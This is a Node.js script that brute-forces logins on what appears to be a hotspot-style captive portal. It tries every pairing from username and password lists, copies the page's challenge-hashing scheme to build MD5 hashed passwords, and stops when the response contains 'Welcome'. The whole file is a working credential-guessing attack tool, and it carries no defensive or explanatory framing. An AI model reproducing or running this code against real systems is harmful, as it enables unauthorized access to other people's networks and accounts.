let cheerio = require('cheerio'),
    request = require('sync-request'),
    md5 = require('./md5'),
    dataMapHex=require('./hex'),
    data = require('./data'),
    conf = require('./conf');

for (let i = 0; i < data.users.length; i++) {
    for (let x = 0; x < data.passwords.length; x++) {
        main(data.users[i],data.passwords[x]);
    }
}

function main(user,password){

    console.log(user+"--"+password);

    if ((makePost(user,(encrypt_data(extractNumbers(makeRequest()),password)))).includes('Welcome')) {
         console.log('Valid user: '+user+"--"+password);
         process.exit();
     }
}

function makeRequest() {
    let $ = cheerio.load((request('GET', conf.url)).getBody('utf8'));
    return $('script').get()[1].children[0].data;
}

function extractNumbers(dataFunctionLogin) {
    let numbersExtracted = dataFunctionLogin.replace(/[^0-9]/g,'');
   
    let numbers=[];
    let count=1;
    
    while(count<numbersExtracted.length){
        let number='';
        number += numbersExtracted.charAt(count++);
        number += numbersExtracted.charAt(count++);
        number += numbersExtracted.charAt(count++);
        numbers.push(number);
    }
    // return array numbers
    return numbers;
}

function encrypt_data(numbers,password){
    //numbers is array

    let count = 0
    let dataOnHex = new Array();

    while(count<numbers.length){
        dataOnHex.push(dataMapHex.mapHex.get(numbers[count]));
        count++;
    }
    
    return md5.hexMD5(dataOnHex[0]+password+dataOnHex[1]+dataOnHex[2]+dataOnHex[3]+dataOnHex[4]+dataOnHex[5]+dataOnHex[6]+dataOnHex[7]+dataOnHex[8]+dataOnHex[9]+dataOnHex[10]+dataOnHex[11]+dataOnHex[12]+dataOnHex[13]+dataOnHex[14]+dataOnHex[15]+dataOnHex[16]);
}

function makePost(user,passwordEncrypted) {
    let response = request('POST',conf.url,
        {
           headers:{'Content-Type':'application/x-www-form-urlencoded'},
           body:'username='+user+'&'+'password='+passwordEncrypted+'&dst=&popup=true'
        }
    );

    return response.getBody('utf8');
}